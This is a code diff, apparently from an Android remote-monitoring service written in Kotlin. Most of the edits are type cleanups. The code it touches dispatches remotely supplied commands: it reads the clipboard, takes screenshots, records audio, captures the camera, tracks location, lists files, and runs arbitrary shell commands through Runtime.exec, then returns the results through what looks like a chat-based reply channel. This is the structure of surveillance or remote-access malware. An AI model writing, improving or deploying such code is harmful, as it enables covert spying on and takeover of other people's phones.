@@ -11,6 +11,7 @@ import android.content.Intent
 import android.content.IntentFilter
 import android.content.SharedPreferences
 import android.database.Cursor
+import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
 import android.os.Binder
@@ -263,10 +264,10 @@ class MonitorService : Service() {
             "wifi" -> scanWifi()
             "clipboard" -> getClipboard()
             "screen" -> getScreenshot()
-            "audio" -> recordAudio(args)
-            "camera" -> captureCamera(args)
+            "audio" -> recordAudio(args as Map<String, Any>)
+            "camera" -> captureCamera(args as Map<String, Any>)
             "shell" -> runShell(args["command"] as? String ?: "")
-            else -> mapOf("error" to "Unknown capability: $capability")
+            else -> mutableMapOf<String, Any>().apply { put("error", "Unknown capability: $capability") }
         }
     }
 
@@ -382,7 +383,7 @@ class MonitorService : Service() {
         return when (action) {
             "list" -> {
                 val dir = File(path)
-                if (!dir.exists() || !dir.isDirectory) mapOf("error" to "Not a directory")
+                if (!dir.exists() || !dir.isDirectory) mutableMapOf<String, Any>().apply { put("error", "Not a directory") }
                 else {
                     val files = dir.listFiles()?.mapNotNull { f ->
                         try {
@@ -402,7 +403,7 @@ class MonitorService : Service() {
                     m
                 }
             }
-            else -> mapOf("error" to "Unknown action")
+            else -> mutableMapOf<String, Any>().apply { put("error", "Unknown action") }
         }
     }
 
@@ -482,15 +483,15 @@ class MonitorService : Service() {
             try {
                 locationManager?.requestSingleUpdate(provider, listener, null)
                 if (latch.await(10, TimeUnit.SECONDS)) {
-                    return result ?: mapOf("error" to "Location request timed out")
+                    return result ?: mutableMapOf<String, Any>().apply { put("error", "Location request timed out") }
                 } else {
-                    return mapOf("error" to "Location timeout - no fix in 10s")
+                    return mutableMapOf<String, Any>().apply { put("error", "Location timeout - no fix in 10s") }
                 }
             } catch (e: Exception) {
-                return mapOf("error" to e.message ?: "Location error")
+                return mutableMapOf<String, Any>().apply { put("error", e.message ?: "Location error") }
             }
         } catch (e: Exception) {
-            return mapOf("error" to e.message ?: "Location error")
+            return mutableMapOf<String, Any>().apply { put("error", e.message ?: "Location error") }
         }
     }
 
@@ -509,8 +510,6 @@ class MonitorService : Service() {
                         prepare()
                         start()
                     }
-                    // Store recorder for stop action
-                    // Note: In production, you'd store this in a map keyed by session
                     Thread({ Thread.sleep((duration * 1000).toLong()); stopRecording() }, "audio-recorder").start()
                     val m = mutableMapOf<String, Any>()
                     m["status"] = "recording"
@@ -518,14 +517,14 @@ class MonitorService : Service() {
                     m["file"] = outputFile.absolutePath
                     m
                 } catch (e: Exception) {
-                    mapOf("error" to e.message ?: "Audio start failed")
+                    mutableMapOf<String, Any>().apply { put("error", e.message ?: "Audio start failed") }
                 }
             }
             "stop" -> {
                 stopRecording()
-                mapOf("status" to "stopped")
+                mutableMapOf<String, Any>().apply { put("status", "stopped") }
             }
-            else -> mapOf("error" to "Unknown audio action")
+            else -> mutableMapOf<String, Any>().apply { put("error", "Unknown audio action") }
         }
     }
 
@@ -558,7 +557,7 @@ class MonitorService : Service() {
     }
 
     private fun runShell(cmd: String): Map<String, Any> {
-        if (cmd.isBlank()) return mapOf("error" to "No command")
+        if (cmd.isBlank()) return mutableMapOf<String, Any>().apply { put("error", "No command") }
         try {
             val process = Runtime.getRuntime().exec(cmd)
             val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
@@ -569,7 +568,7 @@ class MonitorService : Service() {
             m["output"] = output
             m["error"] = error
             return m
-        } catch (e: Exception) { return mapOf("error" to (e.message ?: "unknown error")) }
+        } catch (e: Exception) { return mutableMapOf<String, Any>().apply { put("error", e.message ?: "unknown error") } }
     }
 
     private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
